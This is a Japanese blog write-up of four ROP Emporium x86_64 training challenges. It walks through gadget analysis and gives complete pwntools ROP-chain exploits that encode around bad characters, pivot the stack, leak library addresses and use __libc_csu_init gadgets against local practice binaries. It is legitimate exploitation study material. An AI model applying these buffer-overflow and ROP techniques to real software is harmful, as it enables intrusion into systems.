---
title: ROP Emporium x86_64 writeup 2/2
date: 2022-11-13
---

[前回](https://cashitsuki.com/posts/2022-10-19-rop-emporium-x86-64-writeup-01/)の続き。

## badchars

[問題へのリンク](https://ropemporium.com/challenge/badchars.html)

`print_file`という引数をひとつ取る関数がある。これは引数に渡した文字列をファイルパスと解釈してそのファイルの内容を出力してくれる。引数に`flag.txt`を渡せば解答になるけれど2つ問題がある

1. バイナリのどこにも`flag.txt`の文字列が無い。そのためメモリのどこかに`flag.txt`の文字列を書き込んでそのポインタを`print_file`関数に渡す必要がある
2. 攻撃の起点となる`pwnme`関数には標準入力から受け取った文字を探索して特定の文字列('x', 'g', 'a', '.')をフィルタリングする機能があるのでこれを迂回する必要がある


1については` mov qword ptr [r13], r12; ret;`というガジェットがあるのでこれを利用できる。

```
$ropper -f badchars
(...snip...)
0x0000000000400634: mov qword ptr [r13], r12; ret; 
```

2は`usefulGadgets`というセクションを覗いてみると`xor byte [r15], r14b`というガジェットがある。予め`flag.txt`の文字列をフィルタリングに引っかからない文字列にエンコードしておき、ROPの中でこれを使ってデコードすれば検知をすり抜けることができる。

```
[0x00400628]> pd
            ;-- usefulGadgets:
            0x00400628      453037         xor byte [r15], r14b
            0x0040062b      c3             ret
            0x0040062c      450037         add byte [r15], r14b
            0x0040062f      c3             ret
            0x00400630      452837         sub byte [r15], r14b
            0x00400633      c3             ret
            0x00400634      4d896500       mov qword [r13], r12
            0x00400638      c3             ret
            0x00400639      0f1f80000000.  nop dword [rax]
```

```
#!/usr/bin/env python3
from pwn import *

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    p = process('./badchars')

    # prepare
    write_address    = 0x00601038 + 0x08
    print_file       = pack(0x00400510)
    bss              = pack(write_address)
    flag             = b'dnce,vzv' # xor 2(0x10) with each byte of `flag.txt`
    dummy            = pack(0xdeadbeefdeadbeef)
    pop_rdi          = pack(0x004006a3)
    pop_r12r13r14r15 = pack(0x0040069c)
    mov              = pack(0x00400634)

    # exploit
    # 1) set encoded string `flag.txt`
    payload  = b''
    payload += b'B' * 0x28
    payload += pop_r12r13r14r15
    payload += flag
    payload += bss
    payload += dummy
    payload += dummy
    payload += mov

    # 2) decode all bytes
    payload += decode(write_address + 7)
    payload += decode(write_address + 6)
    payload += decode(write_address + 5)
    payload += decode(write_address + 4)
    payload += decode(write_address + 3)
    payload += decode(write_address + 2)
    payload += decode(write_address + 1)
    payload += decode(write_address + 0)

    # 3) read file
    payload += pop_rdi
    payload += pack(write_address)
    payload += print_file

    p.recvuntil(b'>')
    p.sendline(payload)
    p.interactive()
    return

def decode(address):
    pop_r12r13r14r15 = pack(0x0040069c)
    xor              = pack(0x00400628)
    key              = pack(0x02)
    dummy            = pack(0xdeadbeefdeadbeef)

    payload  = b''
    payload += pop_r12r13r14r15
    payload += dummy
    payload += dummy
    payload += key
    payload += pack(address)
    payload += xor
    return payload

if __name__ == '__main__':
    exploit()
```

## fluff

[問題へのリンク](https://ropemporium.com/challenge/fluff.html)

問題のバイナリには`print_file`という関数がある。これは引数に取った文字列のポインタをファイルパスとして利用することで、ファイルの中身を読み取ってコンソール上に表示してくれる。そのため引数に`flag.txt`と指定したいけれどバイナリの中にその文字は見当たらない。なので一度メモリのどこかに書き込んでからそのポインタを引数として渡すようにしたい。

`questionableGadgets`という名前のシンボルがあるので中身を見ると見慣れない命令がいくつかある。

```
[0x00400628]> pd
            ;-- questionableGadgets:
            0x00400628      d7             xlatb
            0x00400629      c3             ret
            0x0040062a      5a             pop rdx
            0x0040062b      59             pop rcx
            0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
            0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
            0x00400638      c3             ret
            0x00400639      aa             stosb byte [rdi], al
            0x0040063a      c3             ret
            0x0040063b      0f1f440000     nop dword [rax + rax]
```

命令を調べると


1. `xlatb` ... `ebx + al`のアドレスにある値を`al`に書き込む
2. `bextr rbx, rcx, rdx` ... `rdx`で指定した長さとインデックス値を利用して`rcx`から連続するビットを抜き出す。結果を`rbx`に書き込む(
3. `stosb byte [rdi], al` ... `al`の値を`[rdi]`に書き込む

流れとしては

- 特定のアドレスに書き込む処理は3
- 3を使うには`al`をコントロールする1が必要になる
- 1は更に`ebx`を使っているので2が必要になる

よって2,1,3の順番で処理すれば、書き込み許可がある領域に任意の文字を1バイトずつ書き込むことができるようになる。


```
#!/usr/bin/env python3
from pwn import *

FILE = './fluff'

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    elf = ELF(FILE)
    p = process(FILE)

    # making a payload
    addr_bss = 0x00601038
    payload  = b''
    payload += b'A'* 0x28
    payload += store_string()
    payload += p64(0x004006a3) # pop rdi; ret;
    payload += p64(addr_bss)
    payload += p64(elf.plt['print_file'])

    # exploit
    p.recvuntil(b'>')
    p.sendline(payload)
    p.interactive()

    return


def store_string():
    # Store 'flag.txt' at .bss section
    chacacter_location = [
        0x004003c7, # f
        0x004003c1, # l
        0x004003d6, # a
        0x004003cf, # g
        0x004003c9, # .
        0x0040040e, # t
        0x004006c8, # x
        0x0040040e] # t
    offset_al = [0x0b, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78]
    addr_bss = 0x00601038
    payload = b''

    for i in range(8):
        payload += p64(0x004006a3) # pop rdi; ret;
        payload += p64(addr_bss + i)
        payload += p64(0x0040062a) # pop rdx; pop rcx; add rcx 0x3ef2; bextr rbx, rcx, rdx
        payload += p64(0x00004000)
        payload += p64(chacacter_location[i] - offset_al[i] -  0x3ef2)
        payload += p64(0x00400628) # xlatb
        payload += p64(0x00400639) # stosb byte [rdi], al

    return payload


if __name__ == '__main__':
    exploit()
```

## pivot

[問題へのリンク](https://ropemporium.com/challenge/pivot.html)

`flag.txt`の中身を出力する関数`ret2win`は実行バイナリではなく、共有ライブラリである`libpivot.so`にある。そのため共有ライブラリからこの関数のアドレスを知りたい。しかし、共有ライブラリはPIEが有効になっているのでバイナリが置かれる仮想アドレスがランダムにセットされている。そのため`ret2win`関数を呼ぶにはこの関数の絶対アドレスを知る必要がある。

共有ライブラリの中には、`foothold_function`という関数もある。PIEが有効でもそうでなくても`foothold_function`と`ret2win`のアドレスの差は常に同じなので、この2つの関数のアドレスの差と`foothold_function`の絶対アドレスを知ることができれば`ret2win`の絶対アドレスも分かるようになる。

```
pwndbg> plt
0x4006d0: free@plt
0x4006e0: puts@plt
0x4006f0: printf@plt
0x400700: memset@plt
0x400710: read@plt
0x400720: foothold_function@plt
0x400730: malloc@plt
0x400740: setvbuf@plt
0x400750: exit@plt
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 9
 
[0x601018] free@GLIBC_2.2.5 -> 0x4006d6 (free@plt+6) ◂— push   0 /* 'h' */
[0x601020] puts@GLIBC_2.2.5 -> 0x7ffff7c475f0 (puts) ◂— push   r14
[0x601028] printf@GLIBC_2.2.5 -> 0x4006f6 (printf@plt+6) ◂— push   2
[0x601030] memset@GLIBC_2.2.5 -> 0x400706 (memset@plt+6) ◂— push   3
[0x601038] read@GLIBC_2.2.5 -> 0x400716 (read@plt+6) ◂— push   4
[0x601040] foothold_function -> 0x400726 (foothold_function@plt+6) ◂— push   5
[0x601048] malloc@GLIBC_2.2.5 -> 0x7ffff7c5b0f0 (malloc) ◂— mov    rax, qword ptr [rip + 0x147df9]
[0x601050] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c47cd0 (setvbuf) ◂— push   r14
[0x601058] exit@GLIBC_2.2.5 -> 0x400756 (exit@plt+6) ◂— push   8
pwndbg> 
```

これを実施する攻撃コードを作りたいが、今回Buffer Overflowを利用して書き込める領域にはかなり限りがある。そのため`rsp`レジスタの値を書き換えてスタックの位置を変更したい。

コードをよく見るとはじめに`malloc`でメモリ領域を確保した後、その領域をアドレスを提供してくれている。なので、このメモリ内に攻撃コードを書き込んだ後、Stack Pivotでスタックをこの位置に向けるようなコードを書けば良い。

```
#!/usr/bin/env python3

from pwn import *

PIVOT = './pivot'
LIB   = './libpivot.so'

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    lib = ELF(LIB)
    p = process(PIVOT)

    pivot  = 0
    offset = lib.symbols['ret2win'] - lib.symbols['foothold_function']
    plt_foothold = p64(0x400720)
    got_foothold = p64(0x601040)
    call_rax     = p64(0x4006b0)
    pop_rax      = p64(0x4009bb)
    mov_rax_ptr  = p64(0x4009c0)
    pop_rbp      = p64(0x4007c8)
    add_rax_rbp  = p64(0x4009c4)
    xchg_rsp_rax = p64(0x4009bd)

    # 1) making a paylaod that leaks the address of 
    #    `foothold_function` then calls `ret2win`
    payload1  = b''
    payload1 += plt_foothold
    payload1 += pop_rax
    payload1 += got_foothold
    payload1 += mov_rax_ptr
    payload1 += pop_rbp
    payload1 += p64(offset)
    payload1 += add_rax_rbp
    payload1 += call_rax
    
    p.recvuntil(b'pivot: 0x')
    pivot = int(p.recvline().strip(), 16)
    p.recvuntil(b'>')
    p.sendline(payload1)

    # 2) another payload that changes the stack pointer to `pivot`
    payload2  = b''
    payload2 += b'A' * 0x28
    payload2 += pop_rax
    payload2 += p64(pivot)
    payload2 += xchg_rsp_rax
    p.recvuntil(b'>')
    p.send(payload2)
    p.interactive()

    return

if __name__ == '__main__':
    exploit()
```

## ret2csu

[問題へのリンク](https://ropemporium.com/challenge/ret2csu.html)

最後の問題。分からないところがあったので他のwriteupを参考にしながら解いた。

問題文によれば`ret2win`関数を指定された引数で呼べばいい。そのためropperでガジェットを探すも`pop rdx`が見つからない。
問題のページに掲載されている[リンク](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)を読みながらradare2でリバースを続けていると`__libc_csu_init`というシンボルに理想的なガジェットが入っていることが分かったのでこれを利用したい。

```
[0x004006b0]> s 0x00400640
[0x00400640]> pd
            ; DATA XREF from entry0 @ 0x400536
(...snip...)
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
│      ┌──> 0x00400680      4c89fa         mov rdx, r15
│      ╎│   0x00400683      4c89f6         mov rsi, r14
│      ╎│   0x00400686      4489ef         mov edi, r13d
│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
│      ╎│   0x0040068d      4883c301       add rbx, 1
│      ╎│   0x00400691      4839dd         cmp rbp, rbx
│      └──< 0x00400694      75ea           jne 0x400680
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
│       └─> 0x00400696      4883c408       add rsp, 8
│           0x0040069a      5b             pop rbx
│           0x0040069b      5d             pop rbp
│           0x0040069c      415c           pop r12
│           0x0040069e      415d           pop r13
│           0x004006a0      415e           pop r14
│           0x004006a2      415f           pop r15
└           0x004006a4      c3             ret

```

シナリオは以下。

1. 最初に`rip`を`0x0040069a`に向けて1回目のROPを実行する。
2. `r12`から`r15`に必要な値を入れる
2. `rip`を`0x00400680`に向けることでガジェットをもう一周するような形にする
3. 1でレジスタに書き込んだ値を`rdi`、`rsi`、`rdx`レジスタにコピーする
4. `0x004006a4`の`ret`の後に`ret2win`関数を呼ぶ

このままガジェット組みたいが注意点がいくつかある。

- `0x00400691`で`rbp`と`rbx`の値が同じであることを確認しているので2つのレジスタの値を合わせる
- `0x00400696`でrspレジスタが可算されている
- `0x00400689`に`call qword [r12 + rbx*8]`という命令があるのでジャンプしても問題無いよう、関数のアドレスを割り当てる

1つ目は1回目のROPで値を調整すれば良いので簡単にクリアできる。2つ目についてはペイロードにパディングを挿入することで解決できる。3つ目についてはROPで操作したレジスタの値を変更したくないので、引数を取らずかつサイズの小さい関数を割り当てることで解決したい。

シンボルから探すと`_init`関数が条件に合うものなので関数へのアドレスが書き込まれている地点を探す。


```
[0x004006b4]> is
[Symbols]

nth paddr      vaddr      bind   type   size lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
(..snip...)
8   0x000004d0 0x004004d0 GLOBAL FUNC   0        _init
(..snip...)
```


```
pwndbg> search -t qword 0x004004d0
Searching for value: b'\xd0\x04@\x00\x00\x00\x00\x00'
ret2csu         0x400398 rol byte ptr [rax + rax*2], 1
ret2csu         0x400e38 rol byte ptr [rax + rax*2], 1
ret2csu         0x600398 0x4004d0
ret2csu         0x600e38 0x4004d0
warning: Unable to access 16007 bytes of target memory at 0x7ffff7c01000, halting search.
```


`0x400398`が目的の値と分かった。

```
#!/usr/bin/env python3

RET2CSU = './ret2csu'

from pwn import *

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    p = process(RET2CSU)

    # gad1 ... pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    # gad2 ... mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8];
    gad1        = p64(0x0040069a) 
    gad2        = p64(0x00400680)
    ret2win     = p64(0x00400510)
    ptr_to_init = p64(0x00400398)
    pop_rdi     = p64(0x004006a3) 

    # making a payload
    payload  = b''
    payload += b'A' * 0x28

    # 1) first ROP
    payload += gad1
    payload += p64(0x0)                # rbx
    payload += p64(0x1)                # rbp
    payload += ptr_to_init             # r12
    payload += p64(0xdeadbeefdeadbeef) # r13 -> edi
    payload += p64(0xcafebabecafebabe) # r14 -> rsi
    payload += p64(0xd00df00dd00df00d) # r15 -> rdx
    
    # 2) second ROP
    payload += gad2
    payload += p64(0x0) # a padding for `add rsp, 0x08`
    payload += p64(0x0) # rbx
    payload += p64(0x0) # rbp
    payload += p64(0x0) # r12
    payload += p64(0x0) # r13
    payload += p64(0x0) # r14
    payload += p64(0x0) # r15

    # 3) fix `rdi` since the instruction `mov edi, r13d` in the first ROP
    #    does not fill the `rdi` register
    payload += pop_rdi
    payload += p64(0xdeadbeefdeadbeef)

    # 4) exploit
    payload += ret2win

    p.recvuntil(b'>')
    p.sendline(payload)
    p.interactive()

    return


if __name__ == '__main__':
    exploit()
```

## 参考

- [XLAT/XLATB — Table Look-up Translation](https://www.felixcloutier.com/x86/xlat:xlatb)
- [BEXTR — Bit Field Extract](https://www.felixcloutier.com/x86/bextr)
- [STOS/STOSB/STOSW/STOSD/STOSQ — Store String](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq)
- [ROPEmporium ret2csu](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html)
